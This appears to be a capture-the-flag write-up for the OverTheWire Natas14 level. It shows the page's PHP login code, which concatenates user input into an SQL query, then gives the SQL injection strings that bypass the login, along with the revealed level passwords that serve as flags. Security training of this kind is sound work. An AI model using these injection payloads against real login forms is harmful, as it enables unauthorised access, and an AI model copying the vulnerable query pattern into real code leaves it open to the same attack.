# CTF Writeup - **OverTheWire Natas13 - Natas14**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas13 - Natas14
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 13-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas14
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
URL:      http://natas14.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for login credentials as input.  But we dont know anything about it, So lets input some random image and check it out. 

```bash
Username: abc
Password: abc
Submit
```

Now we see that we get access denied. Lets try to get the proper login credentials by viewing the source code. 

```bash
# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysqli_connect('localhost', 'natas14', '<censored>');
#     mysqli_select_db($link, 'natas14');

#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
#             echo "Successful login! The password for natas15 is <censored><br>";
#     } else {
#             echo "Access denied!<br>";
#     }
#     mysqli_close($link);
# } else {
# ?>
```

We can see that there is a small piece of code that is executed when we click on submit. That takes out input username, password and appends it to an sql string and checks if the return value has greater than 1 then its shows the password. Lets try playing with the input for usernames as showin below.

```bash
username: abc" OR \"a
password: 
SQL: SELECT * from users where username=\""abc" OR \"a"\" and password=\"""\""
# Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
# Access denied!
```

Now, we are getting error as its unable to find a entry in the table.  we can see that we need to give proper input such that the resulting sql query fetches more than one record. In order to achieve that, we know that out inputs are getting appended after `where` this elminates the option of `select *` to be inputed. One thing we can do is we can search for the users with username `abc` and those without `abc` together as shown below.  

```bash
username: abc" or username!="abc
password: abc" or password!="abc
SQL: SELECT * from users where username=\""abc" or username!="abc"\" and password=\""abc" or password!="abc"\""
# The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

## Flag

**Flag:** SdqIqBsFcz3yotlNYErZSZwblkm0lrvx


---

## Lessons Learned

It was a simple challenge. I would be best if you can use the owasp zap to see the sql query that is being sent. 